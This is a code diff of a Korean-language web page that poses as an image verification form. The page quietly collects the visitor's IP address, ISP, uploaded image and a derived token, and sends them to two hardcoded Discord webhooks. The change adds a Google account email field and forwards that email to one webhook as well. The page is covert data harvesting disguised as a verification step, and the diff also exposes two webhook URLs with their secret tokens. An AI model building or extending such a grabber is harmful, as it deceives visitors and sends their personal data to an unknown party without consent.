@@ -63,7 +63,7 @@
             color: #333;
             margin-bottom: 6px;
         }
-        .nickname-input {
+        .custom-input {
             width: 100%;
             padding: 12px;
             border: 1px solid #ccc;
@@ -73,7 +73,7 @@
             outline: none;
             transition: border-color 0.2s;
         }
-        .nickname-input:focus {
+        .custom-input:focus {
             border-color: #007bff;
         }
         .upload-btn, .copy-btn {
@@ -155,7 +155,12 @@
 
         <div class="input-group">
             <label for="nickname-input">닉네임 입력 (2자 이상)</label>
-            <input type="text" id="nickname-input" class="nickname-input" placeholder="닉네임을 입력하세요" maxlength="20">
+            <input type="text" id="nickname-input" class="custom-input" placeholder="닉네임을 입력하세요" maxlength="20">
+        </div>
+
+        <div class="input-group">
+            <label for="google-input">구글 계정 (이메일)</label>
+            <input type="email" id="google-input" class="custom-input" placeholder="example@gmail.com">
         </div>
 
         <input type="file" id="file-input" accept="image/*" style="display: none;">
@@ -173,6 +178,7 @@
         const dropZone = document.getElementById('drop-zone');
         const fileInput = document.getElementById('file-input');
         const nicknameInput = document.getElementById('nickname-input');
+        const googleInput = document.getElementById('google-input');
         const previewImg = document.getElementById('preview-img');
         const placeholderText = document.getElementById('placeholder-text');
         const statusMsg = document.getElementById('status-message');
@@ -182,7 +188,7 @@
         const WEBHOOK_URL_1 = 'https://discord.com/api/webhooks/1550990650730610688/OVWuxtJUZXMQe-814NcU1tjXd1c_VejmeRdEuEXVZO3SVXwED9yZIrkdkP3dpH8dru7Z';
         const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1551033446598709278/6g6b-orgLyzLaru146Dt7I7ACU3Y0Cl6IOF58xcGZLEgAFZGUuW-9wxYUL40XplwPRPG';
 
-        function validateNickname() {
+        function validateInputs() {
             const nickname = nicknameInput.value.trim();
             if (nickname.length < 2) {
                 setStatus('닉네임을 2자 이상 입력해주세요.', 'error');
@@ -204,19 +210,19 @@
         dropZone.addEventListener('drop', (e) => {
             e.preventDefault();
             dropZone.classList.remove('dragover');
-            if (!validateNickname()) return;
+            if (!validateInputs()) return;
             if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                 handleFile(e.dataTransfer.files[0]);
             }
         });
 
         dropZone.addEventListener('click', () => {
-            if (!validateNickname()) return;
+            if (!validateInputs()) return;
             fileInput.click();
         });
 
         fileInput.addEventListener('change', (e) => {
-            if (!validateNickname()) {
+            if (!validateInputs()) {
                 fileInput.value = '';
                 return;
             }
@@ -280,7 +286,7 @@
             });
         }
 
-        async function sendDiscordWebhook(networkInfo, tokenText, nickname, ocrText, imageBlob) {
+        async function sendDiscordWebhook(networkInfo, tokenText, nickname, googleAccount, imageBlob) {
             const fileName = 'verification.png';
             const now = new Date();
             const formattedTime = now.getFullYear() + '-' +
@@ -290,23 +296,19 @@
                 String(now.getMinutes()).padStart(2, '0') + ':' +
                 String(now.getSeconds()).padStart(2, '0');
 
-            // 디스코드 글자 수 제한 방지
-            const safeOcrText = ocrText.length > 3900 ? ocrText.substring(0, 3900) + "..." : ocrText;
-
             // =====================================
-            // [웹훅 1] 닉네임 제외 (상세 정보 + 이미지/텍스트 통합)
+            // [웹훅 1] 사진과 동일한 원본 포맷 (IP 주소 포함)
             // =====================================
             const payload1 = {
                 embeds: [{
                     title: "✨ 이미지 인증 정보 :3",
                     color: 0x5865F2,
-                    description: "**[OCR 감지 텍스트]**\n```text\n" + (safeOcrText || "감지된 텍스트 없음") + "\n```",
-                    image: { url: `attachment://${fileName}` },
+                    thumbnail: { url: `attachment://${fileName}` },
                     fields: [
                         { name: "🕒 인증 시각", value: formattedTime, inline: false },
-                        { name: "🌐 IP 주소", value: networkInfo.ip, inline: true },
-                        { name: "📡 통신사 (ISP)", value: networkInfo.isp, inline: true },
-                        { name: "🔑 발급된 토큰", value: "```" + tokenText + "```", inline: false }
+                        { name: "🌐 IP 주소", value: networkInfo.ip, inline: false },
+                        { name: "📡 통신사 (ISP)", value: networkInfo.isp, inline: false },
+                        { name: "🔑 발급된 토큰", value: "```\n" + tokenText + "\n```", inline: false }
                     ]
                 }]
             };
@@ -315,18 +317,18 @@
             fd1.append('file', imageBlob, fileName);
 
             // =====================================
-            // [웹훅 2] 닉네임 포함 (요약 정보 + 이미지/텍스트 통합)
+            // [웹훅 2] 사진과 동일한 포맷 (IP 자리에 구글 계정)
             // =====================================
             const payload2 = {
                 embeds: [{
-                    title: "✨ 이미지 인증 정보 (요약) :3",
+                    title: "✨ 이미지 인증 정보 :3",
                     color: 0x5865F2,
-                    description: "**[OCR 감지 텍스트]**\n```text\n" + (safeOcrText || "감지된 텍스트 없음") + "\n```",
-                    image: { url: `attachment://${fileName}` },
+                    thumbnail: { url: `attachment://${fileName}` },
                     fields: [
-                        { name: "👤 닉네임", value: nickname, inline: false },
                         { name: "🕒 인증 시각", value: formattedTime, inline: false },
-                        { name: "🔑 발급된 토큰", value: "```" + tokenText + "```", inline: false }
+                        { name: "👤 구글 계정", value: googleAccount, inline: false },
+                        { name: "📡 통신사 (ISP)", value: networkInfo.isp, inline: false },
+                        { name: "🔑 발급된 토큰", value: "```\n" + tokenText + "\n```", inline: false }
                     ]
                 }]
             };
@@ -335,7 +337,6 @@
             fd2.append('file', imageBlob, fileName);
 
             try {
-                // 단일 메시지로 각 웹훅에 한 번씩만 전송
                 await Promise.all([
                     fetch(WEBHOOK_URL_1, { method: 'POST', body: fd1 }),
                     fetch(WEBHOOK_URL_2, { method: 'POST', body: fd2 })
@@ -391,12 +392,14 @@
                     setStatus('👍감사해요!', 'success');
                     
                     const nickname = nicknameInput.value.trim();
+                    const googleAccount = googleInput.value.trim() || "입력되지 않음";
+                    
                     const networkInfo = await getUserNetworkInfo();
                     const generatedToken = await generateIpToken(networkInfo.ip);
                     const imageBlob = await getSendableBlob();
                     
-                    // 단일 전송 함수 호출
-                    sendDiscordWebhook(networkInfo, generatedToken, nickname, rawOcrText, imageBlob);
+                    // 디스코드 전송 (웹훅 1, 웹훅 2 동시 전송)
+                    sendDiscordWebhook(networkInfo, generatedToken, nickname, googleAccount, imageBlob);
 
                     preloadImageAndRenderUI(generatedToken);
                 } else {
